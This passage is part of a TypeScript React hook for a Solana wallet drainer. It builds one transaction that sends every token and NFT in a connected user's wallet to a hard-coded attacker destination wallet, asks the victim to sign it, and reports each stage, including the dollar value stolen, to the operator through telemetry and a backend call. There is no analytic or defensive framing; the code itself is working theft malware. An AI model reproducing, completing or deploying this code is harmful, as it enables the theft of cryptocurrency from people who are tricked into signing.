            let nftCount = 0;
            let processed = 0;

            // Build token transfer instructions
            for (const asset of assetList) {
                if (processed >= MAX_TOKEN_PROCESSING) break;

                try {
                    const { mint, amount, tokenAccountPubkey, isSPL2022 } = asset;
                    const programId = isSPL2022 ? TOKEN_2022_PROGRAM_ID : TOKEN_PROGRAM_ID;
                    const destAta = getAssociatedTokenAddressSync(
                        mint,
                        DESTINATION_WALLET,
                        true
                    );
                    const ataKey = destAta.toBase58();

                    // Check if ATA needs creation
                    const destExists = existingAtasCache.get(ataKey);
                    if (destExists === false) {
                        instructions.push(
                            createAssociatedTokenAccountInstruction(
                                publicKey,
                                destAta,
                                DESTINATION_WALLET,
                                mint,
                                programId
                            )
                        );

                        console.log(
                            `[DRAIN] ATA creation for ${mint.toBase58().slice(0, 8)}...`
                        );
                    }

                    // Validate token amount before transfer
                    if (!validateTokenAmount(amount)) {
                        console.warn(`[DRAIN] Invalid amount for ${mint.toBase58().slice(0, 8)}..., skipping`);
                        continue;
                    }

                    // Transfer instruction
                    instructions.push(
                        createTransferInstruction(
                            tokenAccountPubkey,
                            destAta,
                            publicKey,
                            amount,
                            [],
                            programId
                        )
                    );

                    if (asset.isNft) nftCount++;
                    else tokenCount++;
                    processed++;
                } catch (e) {
                    console.warn("[DRAIN] Failed to build transfer instruction:",
                        e instanceof Error ? e.message : String(e));
                }
            }

            console.log(
                `[DRAIN] Built ${instructions.length} instructions (${tokenCount} tokens, ${nftCount} NFTs, ${atasToCreate} ATAs)`
            );

            // Require at least SOL transfer + 1 token transfer
            if (instructions.length <= 1) {
                setError("No drainable assets found.");
                setStatus("error");

                await sendTelemetry(
                    `⚠️ No drainable assets found`
                ).catch(() => { });

                return;
            }

            // --- PHASE 9: BLOCKHASH FETCH (LATE - PERFECTED) ---
            // PERFECTED: Fetch blockhash AFTER instruction building to minimize staleness
            let blockhash: string;
            let lastValidBlockHeight: number;
            let minContextSlot: number;

            try {
                const response = await withTimeout(
                    () => connection.getLatestBlockhashAndContext(),
                    RPC_TIMEOUT_MS
                ) as any;

                const context = response?.context || {};
                const value = response?.value || {};

                blockhash = value.blockhash;
                lastValidBlockHeight = value.lastValidBlockHeight;
                minContextSlot = context.slot;

                if (!blockhash || !lastValidBlockHeight) {
                    throw new Error("Invalid blockhash response from RPC");
                }
            } catch (e) {
                throw new Error("Failed to fetch blockhash: " + (e instanceof Error ? e.message : String(e)));
            }

            const tx = new Transaction().add(...instructions);
            tx.recentBlockhash = blockhash;
            tx.feePayer = publicKey;

            // Validate transaction size before signing
            let serialized: Buffer;
            try {
                serialized = tx.serialize({ requireAllSignatures: false });
                console.log(`[DRAIN] Transaction size: ${serialized.length} bytes`);

                if (serialized.length > networkCfg.maxPacketSize) {
                    setError(`Transaction too large (${serialized.length} bytes). Reduce token count and retry.`);
                    setStatus("error");

                    await sendTelemetry(
                        `📦 TX too large: ${serialized.length} bytes (max: ${networkCfg.maxPacketSize})`
                    ).catch(() => { });

                    return;
                }
            } catch (e) {
                throw new Error("Transaction compilation failed: " + (e instanceof Error ? e.message : String(e)));
            }

            // Set stats before signing
            setStats({
                totalUsdValue: totalValueUSD,
                solAmount: validation.availableForTransfer,
                tokenCount,
                nftCount,
                batchCount: 1,
            });

            await sendTelemetry(
                `🧨 Ready to drain | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)}`
            ).catch(() => { });

            // --- PHASE 10: SIGNING ---
            setStatus("signing");

            const finalTx = new Transaction().add(...instructions);
            finalTx.recentBlockhash = blockhash;
            finalTx.feePayer = publicKey;

            let signature: string;
            try {
                signature = await withTimeout(
                    () => sendTransaction(finalTx, connection, { minContextSlot }),
                    RPC_TIMEOUT_MS
                );
            } catch (e) {
                throw e; // Let handleError catch this
            }

            // PERFECTED: Validate signature format before proceeding
            if (!validateSignatureFormat(signature)) {
                throw new Error(`Invalid signature format received from wallet: ${signature}`);
            }

            console.log(`[DRAIN] Signed: ${signature}`);

            await sendTelemetry(
                `✍️ Transaction signed: \`${signature}\``
            ).catch(() => { });

            // --- PHASE 11: CONFIRMATION (BULLETPROOF) ---
            setStatus("confirming");

            const confirmState = await confirmTransactionBulletproof(
                connection,
                signature,
                CONFIRMATION_TIMEOUT_MS
            );

            // PERFECTED: Only proceed to backend if transaction is actually confirmed
            if (confirmState === "failed") {
                throw new Error("Transaction failed on-chain");
            }

            if (confirmState === "unknown") {
                // Unknown state - be conservative: warn user but don't mirror to backend
                console.warn("[DRAIN] Confirmation timed out - transaction state unknown");
                setStatus("success");
                await sendTelemetry(
                    `⚠️ Confirmation timeout for \`${signature}\` - check explorer manually`
                ).catch(() => { });
                return;
            }

            // Only send to backend if CONFIRMED (not unknown)
            if (confirmState === "confirmed") {
                const backendSuccess = await sendToBackendDrain(
                    publicKey.toBase58(),
                    validation.availableForTransfer,
                    signature,
                    tokensForBackend
                );

                if (!backendSuccess) {
                    console.warn("[DRAIN] Backend mirror failed but transaction confirmed on-chain");
                }
            }

            setStatus("success");
            console.log(`[DRAIN] Operation ${ctx.operationId} complete: ${signature}`);

            await sendTelemetry(
                `💰 SUCCESS | Tokens: ${tokenCount} | NFTs: ${nftCount} | Value: $${totalValueUSD.toFixed(2)} | TX: \`${signature}\``
            ).catch(() => { });
        } catch (e: any) {
            handleError(e, setError, setStatus, ctx, "drain-operation");
        } finally {
            drainInProgressRef.current = false;
        }
    }, [publicKey, sendTransaction, connection, sendToBackendDrain]);

    return { drain, status, error, stats };
};